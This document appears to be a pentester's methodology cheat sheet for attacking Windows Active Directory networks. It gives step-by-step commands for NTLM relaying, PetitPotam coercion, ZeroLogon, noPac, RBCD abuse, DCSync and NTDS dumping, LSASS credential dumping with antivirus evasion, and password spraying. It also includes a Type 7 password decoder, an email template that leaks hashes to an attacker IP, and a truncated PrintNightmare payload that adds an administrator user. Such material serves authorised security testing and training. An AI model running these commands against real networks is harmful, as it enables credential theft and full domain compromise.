# Unauthenticated Pentesting Methodology
___

## Discover Pre2k Computer Objects

[Pre2k](https://github.com/garrettfoster13/pre2k) is a tool to query for the existence of pre-windows 2000 computer objects which can be leveraged to gain a foothold in a target domain. When you pre-create computer accounts with the Assign this computer account as a pre-Windows 2000 computer checkmark, the password for the computer account becomes the same as the computer account in lowercase.

If you discover any affected systems, you now have domain credentials! (PetitPotam, ADCS abuse, enumerate domain, etc.)

## Save a packet capture

sudo timeout 300 tcpdump -i eth1 -s0 -w pcapfile.pcap

### Detect HSRP default password 'cisco'.

https://isc.sans.edu/diary/Network+Reliability%2C+Part+2+-+HSRP+Attacks+and+Defenses/10120

tcpdump -XX -r pcapfile.pcap udp port 1985 or udp port 2029 | grep -B4 cisco

This is a common finding on enterprise networks that will not be detected by vulnerability scanners, so it's likely to have been overlooked. I recommend that you only report on this finding and do not try to exploit it because you may break the network and since you're testing from remote, you won't be there to stop the attack and restore the default router if things go awry! I suggest a severity of "Medium" for this finding due to the default credential and ease of exploitation, yet access is limited to the internal network and enables only a "Person In The Middle" (MiTM) attack.

### Detect LLMNR and NBT-NS

tcpdump -r pcapfile.pcap udp port 137 or udp port 5355

### LLMNR and/or NBT-NS detected?

There are two approaches to exploiting:
1. Run Responder and crack captured hashes:
   - `sudo responder -I eth0 -D -w -P`
   - `sudo hashcat -m 5700 -r [rule file] [hash file] [wordlist]`

2. Relay connections:
   - Run crackmapexec with the --gen-relay-list option to generate a file containing hosts that don't require SMB Signing. `crackmapexec smb [file containing IP's with port 445/tcp open] --gen-relay-list scans/smb-signing.txt`
   - Run Impacket ntlmrelayx with the -tf option specifying the file from the previous step. `./ntlmrelayx -tf scans/smb-signing.txt -l [LOOTDIR] -of [outputfile] -smb2support -socks | tee logs/ntlmrelayx.log`
   - Reconfigure Responder. Edit `/usr/share/responder/Responder.conf`. Under "Servers to start", set `SMB = Off` and save.
   - Rerun Responder: `./Responder.py -I [interface] -wrd`
   - Monitor ntlmrelayx output for any hashes that get dumped. If you get some, move to the Authenticated Methodology and use CrackMapExec.
   - Note: With a socks connection you can only use smbexec or atexec. Neither wmiexec, psexec nor dcomexec will work.

## Find Active Directory domain name:

`nslookup server | grep Server | grep -E -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | nslookup | grep -o '[^ ]*$' | cut -d '.' -f 2- | sed -r 's/\.$//'`

## Find domain controllers

```
domain=$(nslookup server | grep Server | grep -E -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | nslookup | grep -o '[^ ]*$' | cut -d '.' -f 2- | sed -r 's/\.$//');nslookup -type=srv _ldap._tcp."$domain" | grep $domain | grep -o '[^ ]*$' | sed -r 's/\.$//' | tr ' ' '\n' | tee domain-controllers.txt
```
## Null session enumeration

`crackmapexec smb [network address or file] -u '' -p '' --users`

If you detect null session enumeration and you can dump a list of all users, or you have any user names, the proceed to the next section:

## Target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking

Note: This attack normally requires you have valid domain usernames to test.

```
cme ldap [DC IP]-u users.txt -p '' --asreproast asreproast-output.txt
```

Crack any discovered hashes:

```
hashcat -m 18200 asreproast-output.txt wordlist
```

## Port scans / Service Enumeration

Common UDP ports: `53,69,111,161,500,623,2049`

Common TCP ports: `21,22,23,25,53,80,81,88,110,111,123,137-139,161,389,443,445,500,512,513,548,623-624,1099,1241,1433-1434,1521,2049,2483-2484,3268,3269,3306,3389,4333,4786,4848,5432,5800,5900,5901,6000,6001,7001,8000,8080,8181,8443,10000,16992-16993,27017,32764`

### Very fast: Masscan can quickly scan a large network. Common masscan options

`sudo masscan -p <ports> --open --banners -oG <outputfile> -iL <inputfile>`

### Nmap scan of common vulnerable ports

`mkdir scans && sudo nmap -sS -sV -p 21,22,23,25,53,80,81,88,110,111,123,137-139,161,389,443,445,500,512,513,548,623-624,1099,1241,1433-1434,1521,2049,2483-2484,3268,3269,3306,3389,4333,4786,4848,5432,5800,5900,5901,5985,5986,6000,6001,7001,8000,8080,8181,8443,10000,16992-16993,27017,32764 --open -oA scans/nmap-tcp -iL targets.txt`

### Nmap UDP scan

`sudo nmap -sU -p 53,69,111,161,500,623,2049 --open -oA scans/nmap-udp -iL targets.txt`

### Check for anonymous file shares

```
crackmapexec smb <file with scoped networks> -u 'a' -p '' --shares
```

### Enumerate HTTP/S Services

Run [Aquatone](https://github.com/michenriksen/aquatone) and review the report. Check for printers or other network devices using default credentials, and if found check for LDAP connections and hijack the credentials using a 'passback attack'. Check for default credentials and vulnerable versions of discovered web apps.

`cat scans/nmap-tcp.xml | aquatone -nmap -ports xlarge -out aquatone`

### NFS Scan

`grep -e '111/open/tcp' -e '2049/open/tcp' scan.gnmap | cut -d ' ' -f 2 > scans/nfs-hosts.txt && nmap -sV --script rpcinfo,nfs-showmount -iL scans/nfs-hosts.txt -p2049,111 --open | tee scans/NFS.txt`

If you find accessible NFS shares, enumerate share contents for any useable information.

### SIET scan for Cisco Smart Install

Did any scanned hosts have TCP port 4786 open?

`grep '4786/open/tcp' scans/nmap-tcp.gnmap`

If yes, write the IP's to a file: `grep '4786/open/tcp' scans/nmap-tcp.xml | cut -d ' ' -f 2 > scans/smart-install.txt`

Download device configuration files: https://github.com/billchaison/SICD

If you manage to exploit Cisco Smart Install, check any downloaded configuration files for Type 7 passwords. Reverse them easily to obtain a plaintext password using the following script:

```
import sys

V = [0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41, 0x2c, 0x2e,
    0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c, 0x64, 0x4a, 0x4b, 0x44,
    0x48, 0x53, 0x55, 0x42, 0x73, 0x67, 0x76, 0x63, 0x61, 0x36, 0x39,
    0x38, 0x33, 0x34, 0x6e, 0x63, 0x78, 0x76, 0x39, 0x38, 0x37, 0x33,
    0x32, 0x35, 0x34, 0x6b, 0x3b, 0x66, 0x67, 0x38, 0x37]

if len(sys.argv) != 2:
    print("Usage: type7.py hash")
    sys.exit(0)

hash = sys.argv[1]
i = int(hash[:2], 16)
r = ""

for j in range(2, len(hash) - 2, 2):
    h = int(hash[j:j+2], 16)
    r = r + chr(h ^ V[i])
    i = (i + 1) % 53

print r
```

If you recover any plaintext passwords, check for password reuse in Active Directory using discovered passwords to password spray with [Talon](https://github.com/Tylous/Talon).

### IPMI

Check for IPMI open port in nmap scan: `grep '623/udp/open' scans/nmap-udp.gnmap`

If found, write them to a file: `grep '623/udp/open' scans/nmap-udp.gnmap > scans/ipmi-hosts.txt`

Exploit:

```
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts file:scans/ipmi-hosts.txt
run
```

## Exploit DHCPv6 using mitm6

[mitm6](https://github.com/dirkjanm/mitm6) is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. As DNS server, mitm6 will selectively reply to DNS queries of the attackers choosing and redirect the victims traffic to the attacker machine instead of the legitimate server. For a full explanation of the attack, see our blog about mitm6. Mitm6 is designed to work together with ntlmrelayx from impacket for WPAD spoofing and credential relaying.

Monitor the network for unanswered DHCPv6 broadcasts:

```
sudo tcpdump -i eth1 '(udp port 546 or 547) or icmp6'                                                                                               
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode                                                                               
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes                                                                            
11:40:37.906030 IP6 fe80::215:5dff:fe74:720e.dhcpv6-client > ff02::1:2.dhcpv6-server: dhcp6 solicit                                                     
11:42:37.057888 IP6 fe80::215:5dff:fe74:720e.dhcpv6-client > ff02::1:2.dhcpv6-server: dhcp6 solicit
```

Run mitm6:

```
# mitm6 -d [domain.name]
```

Run ntlmrelayx:

```
# impacket-ntlmrelayx -6 -socks -smb2support
```

You can also watch The Cyber Mentor's [video demonstration](https://www.youtube.com/watch?v=zzbIuslB58c).

## Password Spraying

### Finding valid usernames

Kerbrute replacement: https://github.com/Tylous/Talon
### Password spray with CrackMapExec to find users with password same as username

```
crackmapexec smb <DC IP> -u users.txt -p users.txt --no-bruteforce
```

### Password spray common passwords

Try common passwords such as "[CompanyName]#1" and season/year combinations (Winter2022!, Spring2022!, Summer2022!, Summer2022#1 etc.). Get an updated list from https://weakpasswords.net/

## Get password hashes for Active Directory users with "Do Not Require Kerberos Preauthentication" set

In the previous steps, if password spraying or user enumeration via kerbrute reveals valid usernames but you don't have any passwords, try "asreproasting" the valid usernames.

`GetNPUsers.py -dc-ip [Domain Controller IP address] -request [Domain Name]/`

## Eternalblue

Metasploit: `use auxiliary/scanner/smb/smb_ms17_010`

## ZeroLogon CVE-2020-1472

Be sure to restore the DC password or you will break active directory and make the client very unhappy! Watch this Metasploit demo of the exploit and restore BEFORE you exploit it! https://youtu.be/Z5oQmHVsqjA?t=1653

You will need the NetBIOS computer name. It should be the same as the hostname, but you can get the NetBIOS computer name from an nmap service scan (-sV). You can also get the NetBIOS name by running the Metasploit `auxiliary/scanner/netbios/nbname` module.

Use the Metasploit module `admin/dcerpc/cve_2020_1472_zerologon`. To test for the vulnerability, use 'check' instead of 'exploit' or 'run' to start the module.

If vulnerable and your exploit is successful, run secretsdump: `python3 secretsdump.py -just-dc -no-pass DC01\$@10.10.208.101`

Run the Metasploit module again using the RESTORE action to restore the Domain Controller's password.

## ProxyShell (Microsoft Exchange ProxyShell RCE CVE-2021-31207)

Metasploit: `use exploit/windows/http/exchange_proxyshell_rce`. Test for the vulnerability by running the module with 'check'.

## Exploit open SMTP relay

First, configure your system to capture hashes (Responder) or relay (Impacket ntlmrelayx.py). Put recipient email addresses in file emailaddresses.txt.

Content of msg-body.txt:

```
<p>Hello,</p>
<p>[Insert name/company here] is testing for an open SMTP relay. Please forward this to me once you receive it.</p>
<p>Regards,</p>
<p>[Name]</p>
<p>Security Consultant, Penetration Testing</p>
<p>[Company]</p>
<p>[phone]</p>
<p>[email address]</p>
<p><img src="file://[Attacker IP address]/pic.jpg" alt="Download Images" /></p>
```

In the terminal, run:

`while read -r line;do sendemail -f [from address] -t $line -u "Open SMTP relay test via SMTP server $line" -o message-file=msg-body.txt message-content-type=html -s [IP address]:25;done <emailaddresses.txt`

Check Responder/Ntlmrelayx for hashes. Also, ask your point of contact to forward the email, if it resulted in capturing hashes.

## Testing for NTLMv1 and Unauthenticated PetitPotam (CVE-2021-36942)

### Testing Domain Controllers

If this works, you could get DA quickly!

Edit Responder's configuration file at /usr/share/responder/Responder.conf. Change the "Challenge" from random to 1122334455667788

```
Challenge = 1122334455667788
```

Run Responder: `sudo responder -I [interface] --lm --disable-ess`

Run [PetitPotam](https://github.com/topotam/PetitPotam): `python3 PetitPotam.py [listener IP address] [target IP address (Domain Controller)]`

**Note: If the DC is patched and PetitPotam fails but you have ANY domain credentials, see:** [NTLMv1 Enabled?](#ntlmv1-enabled)

You can also spray PetitPotam across a network address using:

```
for i in `seq 1 254`; do python3 PetitPotam.py 192.168.56.118 "192.168.56.$i"; done
```
If you capture a NetNTLMv1 hash without SSP like this:

```
[SMB] NTLMv1 Client   : 192.168.56.12
[SMB] NTLMv1 Username : ESSOS\MEEREEN$
[SMB] NTLMv1 Hash     : MEEREEN$::ESSOS:AF9034E5E4FBA5C95E3E9B515731A6B754167236C0FF8EA9:AF9034E5E4FBA5C95E3E9B515731A6B754167236C0FF8EA9:1122334455667788
```

Go to [Shuck.sh](https://shuck.sh/) and to see if you can recover an NTLM hash, but be sure to first redact the user and domain name!

___


# Authenticated Testing
___

## ADIDNS

By default, domain users can add DNS records. This is required because also by default, domain users can add up to ten computers to Active Directory.

If you run Responder and see hosts broadcasting for missing names over LLMNR and NBT-NS but you don't get any hashes to capture or relay, that's because MS14-077 patches Windows to only send authentication when the hostname is discovered over DNS, and will not send authentication hashes over broadcast protocols such as LLMNR/NBT-NS.

With any domain user credentials you can add the hostname to DNS and point the hostname to your IP address. 

From Windows: https://github.com/Kevin-Robertson/Powermad

From Linux, use dnstool.py found here: https://github.com/dirkjanm/krbrelayx

Add the DNS record then either capture or relay the hashes using Responder or Impacket's ntlmrelayx.

Be sure to remove the record.

## Kerberoasting

```
GetUserSPNs.py -request -dc-ip <DC IP> <domain>/<username>:<password> -outputfile kerberoasting.hashes
```
If you're pentesting an environment with good blue team detections: https://www.trustedsec.com/blog/the-art-of-bypassing-kerberoast-detections-with-orpheus/

If you get hashes, crack them using Hashcat mode 13100.

## NTLMv1 Enabled?

Prerequisite: NetNTLMv1 must be enabled on the target system and you have ANY domain credentials.

### Testing Domain Controllers

If this works, you could get DA quickly!

Edit Responder's configuration file at /usr/share/responder/Responder.conf. Change the "Challenge" from random to 1122334455667788

```
Challenge = 1122334455667788
```

Run Responder: `sudo responder -I [interface] --lm --disable-ess`

Run [PetitPotam](https://github.com/topotam/PetitPotam): `python3 PetitPotam.py [listener IP address] [target IP address (Domain Controller)] -d [domain] -u [username] -p [password]`

You can also spray PetitPotam across a network address using:

```
for i in `seq 1 254`; do python3 PetitPotam.py 192.168.56.118 "192.168.56.$i" -d [domain] -u [username] -p [password]; done
```

If you capture a NetNTLMv1 hash without SSP like this:

```
[SMB] NTLMv1 Client   : 192.168.56.12
[SMB] NTLMv1 Username : ESSOS\MEEREEN$
[SMB] NTLMv1 Hash     : MEEREEN$::ESSOS:AF9034E5E4FBA5C95E3E9B515731A6B754167236C0FF8EA9:AF9034E5E4FBA5C95E3E9B515731A6B754167236C0FF8EA9:1122334455667788
```

... copy the section after "ESSOS" above, go to [Crack.sh](https://crack.sh/get-cracking/) and enter `NTHASH:AF9034E5E4FBA5C95E3E9B515731A6B754167236C0FF8EA9` (replace with your hash), enter your email address, and click the button. You should receive an email within five minutes containing a Token and a Key. The value in the Key is an NTLM hash that you can use to pass the hash. If you got the machine hash for a domain controller, dump the AD NTDS hashes using:

```
impacket-secretsdump -hashes :[NT hash] '[domain]/[DC Netbios name]$@[DC IP'
```

Example: 

```
impacket-secretsdump -hashes :c606dd063a5b6db1081635d675f8bcfe 'ESSOS/MEEREEN$@192.168.56.12'
```

### Testing all other systems

This will get you local admin access to an affected system using the Kerberos ticket of the domain Administrator or other privileged account.

Start an SMB > LDAP relay targeting the DC. 

```
impacket-ntlmrelayx -i -t ldap://[DC FQDN] -smb2support -ip [interface IP] --remove-mic
```

Coerce machine auth using the PrinterBug (or [PetitPotam](https://github.com/topotam/PetitPotam)). Test against domain controllers first.

```
python ./printerbug-kerb.py -k --no-pass [target FQDN] [interface IP]
```

If you see the connection from the desktop to the DC succeed in impacket-ntlmrelayx, continue on to perform RBCD abuse, otherwise stop here.

We need an owned computer account. By default, AD users can create up to 10 computer accounts.

```
impacket-addcomputer -computer-name 'desktop$' -computer-pass 'EvilPa$$123' -dc-host [DC FQDN] [domain]/[username]
```

If you successfully add the computer account:

```
nc localhost 11000
# set_rbcd [target netbios computer name]$  desktop$
```

If the last command succeeds, forge a Silver Ticket.

S4U2self + S4U2Proxy: Get a CIFS ticket for our target system as domain/Administrator using our owned cdw-desktop$ computer account.

```
impacket-getST -spn cifs/[target computer] -impersonate Administrator [domain]/'desktop$':'EvilPa$$123'
```

```
export KRB5CCNAME=/path/to/Administrator.ccache
```

```
impacket-wmiexec -k -no-pass [target fqdn]
```

## Warning on CrackMapExec usage:

Using passwords containing special characters with CrackMapExec may lead to accound lockout when spraying the creds across many systems. Be sure to test the credentials against one host before spraying across the network. You may need to escape some characters such as `Summer2022\!` or enclose the password in single quotes to prevent submitting an invalid password.

## CrackMapExec gpp_autologin and gpp_password modules

gpp_autologin - Searches the domain controller for registry.xml to find autologon information and returns the username and password.

gpp_password - Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.

`crackmapexec smb [DC IP] -u [username] -p [password] -M [module name]`

or...

`crackmapexec smb [DC IP] -u [username] -H [NLTM Hash] -M [module name]`

## Enumerate domain users

Note: Check the output for plaintext passwords in the account description field.

```
crackmapexec smb <DC IP> --users | tee logs/cme-domainusers.log
```

## Enumerate nested Domain Admin group members

First enumerate the builtin Administrators group, becuase the Domain Admins group may not be in a default location in AD.

```
ldapsearch -x -LLL -H ldap://<DC-FQDN> -D '<Domain\username>' -w <password> -b "CN=Administrators,CN=Builtin,DC=uct,DC=local"
```

Find the ldap path to Domain Admins in the output and then use this query to get all nested members:

```
ldapsearch -x -LLL -H ldap://<DC-FQDN> -D '<Domain\username>' -w <password> -b "dc=domain,dc=local" '(memberOf:1.2.840.113556.1.4.1941:=cn=Domain Admins,OU=Infrastructure,OU=Elevated Security Groups and Users,DC=domain,DC=local)' cn
```

Get sAMAccountName of specific member:

```
ldapsearch -x -LLL -H ldap://<DC-FQDN> -D '<Domain\username>' -w <password> -b "CN=someuser,OU=Disabled Accounts,DC=domain,DC=local" | grep sAMAccountName
```

## CrackMapExec - find hosts where the user is a local administrator

It's useful to tee the output to your 'logs' dir so that you can later grep for example a list of affected hosts or recreate a finding for a screenshot! The following commands will result in outputting `Pwn3d!` to the screen as well as dumping local SAM hashes on systems where the user is a local administrator.

`crackmapexec smb [hostname/IP/file list] -u [username] -p [password] --sam | tee logs/cme-[username].log`

or...

`crackmapexec smb [hostname/IP/file list] -u [username] -H [NLTM Hash] --sam | tee logs/cme-[username].log`

It is helpful to run the command again using the `--lsa` option to get LSA secrets, which frequently contain plaintext passwords!

## Dumping LSASS creds

### Latest method: CrackMapExec Masky module

If you have admin privilege, the module will impersonate all users connected -> ask a certificate (ADCS) -> retrieve the NT hash using PKINIT.

```
crackmapexec ldap <IP or file> -u <username> -p <password> -M adcs
```

### Dump lsass process memory and get passwords or hashes

`crackmapexec smb [hostname/IP/file list] -u [username] -p [password] -M lsassy`

or...

`crackmapexec smb [hostname/IP/file list] -u [username] -H [NLTM Hash] -M lsassy`

If the lsassy module doesn't work, also try the CrackMapExec handlekatz and nanodump modules. 

A more stealthy way, if you suspect you're getting stomped by antivirus, is to connect to a host over RDP, impacket-wmiexec or impacket-psexec, and run [ForkDump](https://github.com/D4stiny/ForkPlayground) If you use this method it's useful to mount a local SMB share (Remmina/Xfreerdp/Impacket) and run the tool directly from the share and save the output to the share.

### Dump lsass by using a forensics tool signed exe to dump all memory and parse lsass offline

Note: This method is not ideal if the target system has a large amount of RAM because the memory dump will be the same size as total RAM. So check the system RAM amount first!

Windows Defender and EDR will monitor API calls to dump lsass.exe process memory. What would happen if you use a signed executable that is not considered to be malicious by antivirus vendors to dump all of physical memory instead of targeting lsass.exe specifically?

WinPmem is a forensics tool that will save a copy of all of physical memory to a raw file dump. The executable is signed and at the time this was written it was detected as malicious by only 1/72 vendors (SecureAge). Download WinPmem, x86 or x64 depending on your target architecture (usually x64 in production): https://github.com/Velocidex/WinPmem/releases

Run the exe from a file share (Impacket smbserver.py) and save the output raw memory dump back to the share.

Copy the memory dump file back over to your system and save it to a Windows virtual machine under your control. On your Windows vm, download and install the Dokan file system driver from here: https://github.com/dokan-dev/dokany/releases/

Next, download MemProcFS and extract it to your Windows vm from here: https://github.com/ufrisk/MemProcFS

Run MemProcFS in a cmd prompt:

C:\tools\MemProcFS>MemProcFS.exe -device C:\path\to\mem.raw

MemProcFS will extract the memory dump and mount the files to M:\

Leave the MemProcFS window open for now. When you enter Ctrl-C it unmounts the memory dump and exits.

Install Windbg: https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools

You will also need Mimikatz. You will have to either disable Windows Defender or whitelist a directory in Defender where you will be saving Mimikatz.

After installation, run Windbg and click File > “Open a Crash Dump”. Browse to and select M:\memory.dmp and click the Open button.

In the bottom, left hand corner of WinDbg there is an input form preceded by “kd>”.

Enter the following commands, using the actual path to your Mimikatz mimilib.dll file:

```
.load C:\path\to\mimikatz\x64\mimilib.dll

!process 0 0 lsass.exe
```

The previous command will display the memory location for the lsass.exe process

## Enumerate accessible file shares

`crackmapexe smb [hostname/IP/file list] -u [username] -p [password] | tee logs/cme-[username]-shares.log`

or...

`crackmapexe smb [hostname/IP/file list] -u [username] -H [NLTM Hash] | tee logs/cme-[username]-shares.log`

Then go and grep the output for accessible shares. `grep -e READ -e WRITE logs/cme-[username]-shares.log`

## Search file shares for credentials

Very frequently we discover credentials in scripts and documents stored in file shares.

The [mount_shares](https://github.com/sho-luv/mount_shares) tool makes it easy to mount Windows shares from Linux.

If you have access to a Windows host, you can simply use Windows Explorer to view the share, then in the search bar enter `passw` and wait for the output.

## BloodHound

There are two options for gathering data to import into BloodHound:
  - [BloodHound.py](https://github.com/fox-it/BloodHound.py) - Python version you can run from the internal laptop.
  - [BloodHound.exe and SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) - for use on Windows hosts.

BloodHound and Neo4j nstallation instructions can be found [here](https://bloodhound.readthedocs.io/en/latest/index.html).

It is recommended that you use the `DCOnly` collection method first, because some other collection methods may connect to every host in the domain and some of those hosts may not be in scope! The DCOnly collection method is also less noisy and completes faster. Running the collection on large domains as well as importing the data into BloodHound may take a very long time on large domains! Then run a second collection using the `LocalAdmin,RDP,Session` collection methods along with the `--computerfile COMPUTERFILE` option to only establish connections with hosts in scope.

## Unconstrained Delegation to dump NTDS.DIT

Note: To perform this attack you must have local admin rights on a system configured with unconstrained delegation.

Find systems with unconstrained delegation using BloodHound: `MATCH (c {unconstraineddelegation:true}) return c`

Access the system configured with unconstrained delegation where you have local admin rights. You can use an RDP session, PS Remoting, impacket-wmiexec, etc, but you must have an elevated cmd prompt. Copy an obfuscated copy of Rubeus to the system, or use reflection to load it in memory.

Run Coercer to coerce a domain controller to connect to the system where you have local admin and is configured with unconstrained delegation:

```
python3 coercer.py coerce -d <domain> -u <username> -p <password> -t <domain controller> -l <system with unconstrained delegation>
```

On the system unconstrained delegation, run `Rubeus triage`. You should see an entry with a UserName like `DOMAINCONTROLLER$ @ DOMAINNAME.LOCAL` and a Service like `krbtgt/DOMAINNAME.LOCAL`.

Extract the ticket using Rubeus:

```
Rubeus.exe dump /user:DOMAINCONTROLLER$ /service:krbtgt /nowrap
```

Copy the ticket base64 encoded output to a file on your Kali system. `cat tgt.b64|base64 -d > ticket.kirbi`

If there are spaced and line returns in the ticket (There shouldn't be if you used /nowrap, but still:), remove the leading spaces and line returns using vim: `:%s/\s*\n\s*//g`

Convert the ticket to ccache format: `ticketConverter.py ticket.kirbi ticket.ccache`

Use the ticket and launch secretsdump:

```
export KRB5CCNAME=ticket.ccache
secretsdump.py -k -no-pass DOMAINNAME.LOCAL/'DOMAINCONTROLLER$'@DOMAINCONTROLLER
```

## GenericWrite ACL (Role Based Constrained Delegation)

GenericWrite to a computer object can be used to perform a resource based constrained delegation attack. In this example, user joe has GenericWrite on the DC02.corp.local Domain Controller.

### From Linux 

https://github.com/tothi/rbcd-attack

https://www.alteredsecurity.com/post/resource-based-constrained-delegation-rbcd

This attack requires a different version of rbcd.py than the one that comes with Impacket. Get it from https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py

Add a computer: `impacket-addcomputer -computer-name 'evilcomputer$' -computer-pass Password12345 -dc-ip [DC IP] [domain]/[username]:[password]`

Modifying delegation rights: `python3 rbcd.py -f EVILCOMPUTER -t dc02 -dc-ip [DC IP] -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local\\joe`

Getting the impersonated service ticket. If you follow the instructions from the BloodHound "Abuse info", it tells you to use 'cifs'. However, since we want to dump NTDS from the domain controller, we use 'ldap' in this case. `getST.py -spn ldap/dc02.corp.local -impersonate administrator -dc-ip [DC IP] corp.local/EVILCOMPUTER$:Password12345`

After adding the file path to the KRB5CCNAME variable the ticket is usable for Kerberos clients. `export KRB5CCNAME=$(pwd)/administrator.ccache`

Run Secretsdump or CrackMapExec: `cme smb dc02.corp.local -k --ntds`


### From Windows PowerShell

Import [Powermad.ps1](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1) and [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) into your PowerShell session.

If an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account: `New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)`

```
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer [target (domain controller)] | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
.\Ghostpack\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:ADMINISTRATOR /msdsspn:LDAP/[target fqdn] /ptt
mimikatz.exe
lsadump::dcsync /dc:dc02.corp.local /domain:corp.local /all /csv
```

## ADCS - Exploiting Active Directory Certificate Services

Install certipy: sudo apt install -y certipy-ad

Run it and check domain controllers: 

```
certipy-ad find -u <username> -p <password> -vulnerable -dc-ip <dc ip> -stdout
```

This blog post has some useful info on exploitation: https://mayfly277.github.io/posts/GOADv2-pwning-part6/

## SamAccountName (nopac, CVE-2021-42287)

Explanation of the vulnerability: https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html

Test if the DC is vulnerable: `crackmapexec smb <file containing DC IP's> -M nopac`

If yes, proceed to the next steps:

Check if we can add a computer: `cme ldap <DC FQDN> -u <username> -p <password> -d <domain name> -M MAQ`

The changed to impacket have not yet been merged to the release branch, so let's pull the version we need:

```
cd /opt
git clone https://github.com/SecureAuthCorp/impacket myimpacket
cd myimpacket
git checkout -b mydev
```

Create a venv:

```
python3 -m virtualenv myimpacket
source myimpacket/bin/activate
python3 -m pip install .
```

Get the waiting pull requests we need and merge them to our branch:

```
git fetch origin pull/1224/head:1224
git fetch origin pull/1202/head:1202
git merge 1202
git merge 1224
```

Reorder the path entry result to load our pyenv bin before the others in the $PATH (this is needed on zsh, in bash it take directly our pyenv bins) `rehash`

What we will do is add a computer, clear the SPN of that computer, rename computer with the same name as the DC, obtain a TGT for that computer, reset the computer name to his original name, obtain a service ticket with the TGT we get previously and finally dcsync :)

Add a computer: `addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'`

Clear the SPNs of our new computer (with dirkjan krbrelayx tool addspn): 

```
addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'
```
Rename the computer (computer -> DC)

```
renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing
```

Obtain a TGT

```
getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'
```

Reset the computer name back to the original name

```
renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing
```

Obtain a service ticket with S4U2self by presenting the previous TGT

```
export KRB5CCNAME=/workspace/winterfell.ccache
getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
```

DCSync by presenting the service ticket

```
export KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'
```

Now clean up by deleting the computer we created with the administrator account hash we just got

```
addcomputer.py -computer-name 'samaccountname$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' 'north.sevenkingdoms.local/Administrator'
```

## PrintNightmare

we will first check if the spooler is active on targets: `crackmapexec smb <ip or file> -M spooler | tee logs/cme-spooler.log`

Payload to add a user to the administrators group:

```
/*
 * ADDUSER.C: creating a Windows user programmatically.
 */

#define UNICODE
#define _UNICODE

#include <windows.h>
#include <string.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <tchar.h>


DWORD CreateAdminUserInternal(void)
{
    NET_API_STATUS rc;
    BOOL b;
    DWORD dw;

    USER_INFO_1 ud;
    LOCALGROUP_MEMBERS_INFO_0 gd;
    SID_NAME_USE snu;

    DWORD cbSid = 256;    // 256 bytes should be enough for everybody :)
    BYTE Sid[256];

    DWORD cbDomain = 256 / sizeof(TCHAR);
    TCHAR Domain[256];

    // Create user
    memset(&ud, 0, sizeof(ud));

    ud.usri1_name        = _T("pnightmare2");                // username
    ud.usri1_password    = _T("Test123456789!");             // password
    ud.usri1_priv        = USER_PRIV_USER;                   // cannot set USER_PRIV_ADMIN on creation
    ud.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;    // must be set
    ud.usri1_script_path = NULL;

    rc = NetUserAdd(
        NULL,            // local server
        1,                // information level
        (LPBYTE)&ud,
        NULL            // error value
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetUserAdd FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

   _tprintf(_T("NetUserAdd OK\r\n"), rc, rc);

    // Get user SID
    b = LookupAccountName(
        NULL,            // local server
        ud.usri1_name,   // account name
        Sid,             // SID
        &cbSid,          // SID size
        Domain,          // Domain
